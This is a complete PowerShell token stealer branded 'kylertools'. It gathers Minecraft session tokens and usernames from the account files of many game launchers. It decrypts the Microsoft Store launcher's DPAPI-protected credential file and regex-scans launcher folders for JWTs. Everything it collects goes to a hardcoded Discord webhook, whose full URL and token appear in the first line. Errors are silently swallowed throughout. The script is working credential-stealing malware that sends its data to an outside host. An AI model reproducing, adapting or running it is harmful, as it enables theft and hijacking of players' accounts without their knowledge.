$webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit"
$h = @{ "Content-Type" = "application/json" }

# test ping
try{
    $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
    iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 10 -EA 0 | Out-Null
}catch{}

$found = @()
$seen = @{}
$jwtRegex = "eyJhbGciOiJIUzI1NiJ9\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+"

function Add-Token {
    param($tok, $user, $src)
    if(-not $tok){ return }
    if($tok.Length -lt 20){ return }
    if($seen.ContainsKey($tok)){ return }
    $seen[$tok] = $true
    $script:found += "user: $user`nssid: $tok`nfile: $src`n"
}

# 1. old + new account jsons
$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json"
)

foreach($p in $paths){
    if(Test-Path $p){
        try{
            $raw = Get-Content $p -Raw
            $j = $raw | ConvertFrom-Json -EA 0
            if($j.accounts){
                $j.accounts.PSObject.Properties | %{
                    $a = $_.Value
                    $tok = $null
                    $uname = "unknown"
                    if($a.accessToken){ $tok = $a.accessToken }
                    if($a.minecraftProfile -and $a.minecraftProfile.name){ $uname = $a.minecraftProfile.name }
                    elseif($a.username){ $uname = $a.username }
                    Add-Token $tok $uname $p
                }
            }
            # fallback regex scan
            [regex]::Matches($raw, $jwtRegex) | %{ Add-Token $_.Value "unknown" $p }
        }catch{}
    }
}

# 2. decrypt the MSA credential bin (the live one)
$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $bytes = [IO.File]::ReadAllBytes($bin)
        $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, "CurrentUser")
        $txt = [Text.Encoding]::UTF8.GetString($dec)
        $jj = $txt | ConvertFrom-Json -EA 0
        $tok = $null
        $uname = "unknown"
        if($jj.microsoftAccount -and $jj.microsoftAccount.accessToken){ $tok = $jj.microsoftAccount.accessToken }
        elseif($jj.accessToken){ $tok = $jj.accessToken }
        if($jj.minecraftProfile -and $jj.minecraftProfile.name){ $uname = $jj.minecraftProfile.name }
        Add-Token $tok $uname $bin
        # also regex it
        [regex]::Matches($txt, $jwtRegex) | %{ Add-Token $_.Value $uname $bin }
    }catch{}
}

# 3. deep scan launcher folders - account files only
$roots = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.lunarclient",
    "$env:APPDATA\ModrinthApp",
    "$env:APPDATA\PrismLauncher",
    "$env:APPDATA\MultiMC",
    "$env:APPDATA\xmcl",
    "$env:APPDATA\.technic",
    "$env:APPDATA\.feather"
)

foreach($r in $roots){
    if(Test-Path $r){
        try{
            Get-ChildItem $r -Recurse -File -Include "accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","*.auth.json" -EA 0 | %{
                if($_.Length -gt 1mb){ return }
                $c = Get-Content $_.FullName -Raw -EA 0
                [regex]::Matches($c, $jwtRegex) | %{ Add-Token $_.Value "unknown" $_.FullName }
            }
        }catch{}
    }
}

if($found.Count -eq 0){
    $found = "nothin found bro"
}

$joined = $found -join "`n"

# chunk to fit webhook limit
$limit = 1800
$chunks = @()
for($i = 0; $i -lt $joined.Length; $i += $limit){
    $chunks += $joined.Substring($i, [Math]::Min($limit, $joined.Length - $i))
}

$n = 0
foreach($c in $chunks){
    $n++
    $embed = @{
        title = "mc tokens"
        description = "``````$c``````"
        color = 5793266
        footer = @{ text = "kylertools | part $n/$($chunks.Count)" }
        timestamp = (Get-Date).ToString("o")
    }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
    try{
        iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 10 -EA 0 | Out-Null
    }catch{}
    Start-Sleep -Milliseconds 900
}
